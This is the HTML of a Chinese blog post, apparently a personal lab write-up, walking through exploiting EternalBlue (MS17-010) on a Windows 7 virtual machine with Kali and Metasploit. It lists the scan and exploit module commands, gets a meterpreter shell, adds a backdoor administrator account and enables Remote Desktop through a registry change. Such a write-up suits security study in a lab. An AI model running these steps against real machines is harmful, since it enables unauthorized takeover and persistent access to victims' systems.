@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>Windows永恒之蓝漏洞考古实验 | 林君需要温习</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://linjunya.github.io//favicon.ico?v=1723624590115">
+<link rel="stylesheet" href="https://linjunya.github.io//styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="Windows考古——永恒之蓝漏洞
+实验环境
+
+kali
+windows7
+
+实验过程
+
+
+nmap扫描这个村长有哪些人可以霍霍
+
+
+这里能看到有119.2这个局域网的网关，
+119.131这个有n多个端口的则是局域网内的靶机（445/tc..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://linjunya.github.io/">
+        <img src="https://linjunya.github.io//images/avatar.png?v=1723624590115" class="site-logo">
+        <h1 class="site-title">林君需要温习</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      温故而知新
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://linjunya.github.io//atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">Windows永恒之蓝漏洞考古实验</h2>
+            <div class="post-date">2024-08-14</div>
+            
+            <div class="post-content" v-pre>
+              <h1 id="windows考古永恒之蓝漏洞">Windows考古——永恒之蓝漏洞</h1>
+<h2 id="实验环境">实验环境</h2>
+<ul>
+<li>kali</li>
+<li>windows7</li>
+</ul>
+<h2 id="实验过程">实验过程</h2>
+<ol>
+<li>
+<p>nmap扫描这个村长有哪些人可以霍霍<img src="C:%5CUsers%5Clinjun%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240814142845746.png" alt="image-20240814142845746" loading="lazy"></p>
+<ol>
+<li><img src="C:%5CUsers%5Clinjun%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240814143327784.png" alt="image-20240814143327784" loading="lazy"></li>
+<li>这里能看到有119.2这个局域网的网关，</li>
+<li>119.131这个有n多个端口的则是局域网内的靶机（445/tcp   open  microsoft-ds）靶机的445端口是开放的，而永恒之蓝利用的就是445端口的SMB服务，操作系统溢出漏洞。，</li>
+<li>119.254则是广播口（maybe吧，我现在不是很确定)</li>
+<li>119.128则是我本机所在，甚至还能看见打开了ssh服务，我用的第三方软件连接的kali。</li>
+</ol>
+</li>
+<li>
+<p>打开msf控制台<img src="C:%5CUsers%5Clinjun%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240814144533871.png" alt="image-20240814144533871" loading="lazy"></p>
+</li>
+<li>
+<p>搜索永恒之蓝代号ms17_010<img src="C:%5CUsers%5Clinjun%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240814144832632.png" alt="image-20240814144832632" loading="lazy"></p>
+</li>
+<li>
+<p>选中他，你用</p>
+<pre><code> use [编号][全名][序号都行]
+</code></pre>
+</li>
+<li>
+<p>auxiliary/scanner/smb/smb_ms17_010 是永恒之蓝扫描模块， exploit/windows/smb/ms17_010_eternalblue 是永恒之蓝攻击模块。<br>
+一般配合使用，前者先扫描，若显示有漏洞，再进行攻击</p>
+<ol>
+<li>
+<pre><code>use auxiliary/scanner/smb/smb_ms17_010
+
+</code></pre>
+</li>
+<li>
+<pre><code>set rhosts 192.168.119.131
+
+</code></pre>
+</li>
+<li>
+<p>然后run</p>
+</li>
+<li>
+<p>扫描完了就可以开始攻击了</p>
+</li>
+<li>
+<p>选中模块</p>
+</li>
+<li>
+<pre><code>use exploit/windows/smb/ms17_010_eternalblue
+</code></pre>
+</li>
+<li>
+<p>设置目标</p>
+<pre><code>set rhosts 192.168.119.131
+</code></pre>
+</li>
+<li>
+<p>run</p>
+</li>
+</ol>
+</li>
+<li>
+<figure data-type="image" tabindex="2"><img src="C:%5CUsers%5Clinjun%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240814145557319.png" alt="image-20240814145557319" loading="lazy"></figure>
+</li>
+<li>
+<p>攻击完之后，你会得到一个meterpreter，这是你执行攻击的载荷</p>
+</li>
+<li>
+<p>shell一下就可以操控他了<img src="C:%5CUsers%5Clinjun%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240814145723382.png" alt="image-20240814145723382" loading="lazy"></p>
+</li>
+<li>
+<p>chcp 65001解决乱码</p>
+</li>
+<li>
+<p>通过shell对靶机进行控制</p>
+<ol>
+<li>
+<pre><code class="language-shell">net user sss 123456 /add
+#添加一个新的用户
+
+</code></pre>
+</li>
+<li>
+<pre><code class="language-shell">net user
+#查看用户信息
+</code></pre>
+</li>
+<li>
+<pre><code class="language-shell">net localgroup Adminstrators sss /add
+#将sss添加至管理员组
+</code></pre>
+</li>
+</ol>
+</li>
+<li>
+<p>开启远程桌面功能</p>
+<ol>
+<li>
+<p>查看3389端口状态，是否开启，我们通过这个端口进行远程控制</p>
+</li>
+<li>
+<pre><code class="language-shell">netstat -ano
+</code></pre>
+</li>
+<li>
+<figure data-type="image" tabindex="3"><img src="C:%5CUsers%5Clinjun%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240814150343363.png" alt="image-20240814150343363" loading="lazy"></figure>
+</li>
+<li>
+<pre><code class="language-shell">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+#设置3389端口开启
+
+</code></pre>
+</li>
+</ol>
+</li>
+<li>
+<pre><code class="language-shell">rdesktop 192.168.119.131:3389
+#远程桌面连接靶机
+</code></pre>
+</li>
+<li>
+<p>使用创建的用户进行登录</p>
+</li>
+<li>
+<p>登录成功你就能嘿嘿嘿了。</p>
+</li>
+</ol>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://linjunya.github.io/post/dong-tai-lu-you-plus/">
+                  <h3 class="post-title">
+                    动态路由plus
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
